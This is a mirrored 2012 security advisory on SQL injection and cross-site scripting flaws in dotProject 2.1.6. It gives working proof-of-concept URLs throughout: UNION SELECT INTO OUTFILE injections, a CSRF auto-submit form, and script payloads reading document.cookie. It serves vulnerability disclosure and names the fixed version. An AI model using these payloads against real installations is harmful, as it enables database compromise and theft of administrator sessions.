@@ -1,0 +1,128 @@
+id: 19782
+date: 11/22/2012
+title: dotProject 2.1.6 Cross Site Scripting / SQL Injection
+author: High-Tech Bridge
+cves: 
+
+Product: dotProject
+Vendor: dotproject.net
+Vulnerable Version(s): 2.1.6 and probably prior
+Tested Version: 2.1.6
+Vendor Notification: October 31, 2012 
+Vendor Patch: November 7, 2012 
+Public Disclosure: November 21, 2012 
+Vulnerability Type: SQL Injection [CWE-89], Cross-Site Scripting [CWE-79]
+CVE References: CVE-2012-5701, CVE-2012-5702
+CVSSv2 Base Scores: 6 (AV:N/AC:M/Au:S/C:P/I:P/A:P), 2.6 (AV:N/AC:H/Au:N/C:N/I:P/A:N)
+Solution Status: Fixed by Vendor
+Risk Level: Medium 
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in dotProject, which can be exploited to perform SQL injection and cross-site scripting (XSS) attacks.
+
+
+1) SQL Injection in dotProject: CVE-2012-5701
+
+High-Tech Bridge Security Research Lab has discovered multiple SQL injection vulnerabilities in dotProject administrative interface. A remote authenticated administrator can execute arbitrary SQL commands in application's database. These vulnerabilities could also be exploited by a remote non-authenticated attacker via CSRF vector, since the application is prone to cross-site request forgery attacks. In order to do so an attacker should trick the logged-in administrator to visit a web page with CSRF exploit.
+
+1.1 Vulnerability exists due to insufficient sanitation of input passed via the "search_string" HTTP GET parameter to the index.php script. A remote authenticated administrator can execute arbitrary SQL commands in application's database.
+
+Depending on database and system configuration, this PoC code will create a /tmp/file.txt file, containing MySQL server version:
+
+http://[host]/index.php?m=contacts&search_string=0%27%29%20UNION%20SELECT%20version(),2,3,4,5,6,7,8,9,10,11%20INTO%20OUTFILE%20%27file.txt%27%20--%202
+
+The second PoC demonstrates exploitation of the same vulnerability via CSRF vector:
+
+
+<form action="http://[host]/index.php" method="GET" name="F1">
+<input type="hidden" name="m" value="contacts">
+<input type="hidden" name="search_string" value="0') UNION SELECT version(),2,3,4,5,6,7,8,9,10,11 INTO OUTFILE '/tmp/file.txt' -- 2">
+</form>
+<script>
+document.F1.Submit();
+</script>
+
+
+1.2 Vulnerability exists due to insufficient sanitation of input passed via the "where" HTTP GET parameter to the index.php script. A remote authenticated administrator can execute arbitrary SQL commands in application's database.
+
+Depending on database and system configuration, this PoC code will create a /tmp/file.txt file, containing MySQL server version:
+
+http://[host]/index.php?m=contacts&where=%27%29%20UNION%20SELECT%20version(),2,3,4,5,6,7,8,9,10,11%20INTO%20OUTFILE%20%27/tmp/file.txt%27%20--%202
+
+1.3 Vulnerability exists due to insufficient sanitation of input passed via the "dept_id" HTTP GET parameter to the index.php script. A remote authenticated administrator can execute arbitrary SQL commands in application's database.
+
+Depending on database and system configuration, this PoC code will create a /tmp/file.txt file, containing MySQL server version:
+
+http://[host]/index.php?m=departments&dept_id=%27%20UNION%20SELECT%20version%28%29%20INTO%20OUTFILE%20%27/tmp/file.txt%27%20--%202
+
+Successful exploitation of vulnerabilities 1.1 – 1.3 requires that "magic_quotes_gpc" is set to "off" in php.ini.
+
+
+1.4 Vulnerability exists due to insufficient sanitation of input passed via the "project_id" HTTP GET parameter to the index.php script. A remote authenticated administrator can execute arbitrary SQL commands in application's database.
+
+Depending on database and system configuration, this PoC code will create a /tmp/file.txt file, containing MySQL server version:
+
+http://[host]/?m=projects&update_project_status=1&project_status=1&project_id[]=%27%20UNION%20SELECT%20version%28%29%20INTO%20OUTFILE%20%27/tmp/file.txt%27%20--%202
+
+1.5 Vulnerability exists due to insufficient sanitation of input passed via the "company_id" HTTP GET parameter to the index.php script. A remote authenticated administrator can execute arbitrary SQL commands in application's database.
+
+Depending on database and system configuration, this PoC code will create a /tmp/file.txt file, containing MySQL server version:
+
+http://[host]/?m=system&a=billingcode&company_id=0%20UNION%20SELECT%201,2,3,4,5,6%20INTO%20OUTFILE%20%27/tmp/file.txt%27%20--%202
+
+
+
+2) Cross-Site Scripting (XSS) in dotProject: CVE-2012-5702
+
+High-Tech Bridge Security Research Lab has discovered multiple cross-site scripting vulnerabilities in dotProject administrative interface. 
+
+2.1 Input sanitation error was found in the index.php script when handling the "callback" HTTP GET parameter. A remote attacker can execute arbitrary HTML and script code in administrator's browser in context of an affected website.
+
+The following PoC demonstrates the vulnerability:
+
+http://[host]/?m=public&a=color_selector&callback=%3C/script%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+2.2 Input sanitation error was found in the index.php script when handling the "field" HTTP GET parameter. A remote attacker can execute arbitrary HTML and script code in administrator's browser in context of an affected website.
+
+The following PoC demonstrates the vulnerability:
+
+http://[host]/?m=public&a=date_format&field=%3C/script%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+2.3 Input sanitation error was found in the index.php script when handling the "company_name" HTTP GET parameter. A remote attacker can execute arbitrary HTML and script code in administrator's browser in context of an affected website.
+
+The following PoC demonstrates the vulnerability:
+
+http://[host]/index.php?m=contacts&a=addedit&contact_id=0&company_id=1&company_name=%22%20onmouseover=%22javascript:alert%28document.cookie%29%22
+
+2.4 Input sanitation error was found in the index.php script when handling the "date" HTTP GET parameter. A remote attacker can execute arbitrary HTML and script code in administrator's browser in context of an affected website.
+
+The following PoC demonstrates the vulnerability:
+
+http://[host]/index.php?a=day_view&date=%22%20onmouseover=%22javascript:alert%28document.cookie%29%22
+
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Upgrade to dotProject 2.1.7
+
+More Information:
+http://sourceforge.net/projects/dotproject/files/dotproject/dotProject%20Version%202.1.7/
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23124 - https://www.htbridge.com/advisory/HTB23124 - Multiple vulnerabilities in dotProject.
+[2] dotProject - http://www.dotproject.net - dotProject is a volunteer supported Project Management application.
+[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
+[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types. 
+
+-----------------------------------------------------------------------------------------------
+
+#  0day.today [2023-03-25]  #
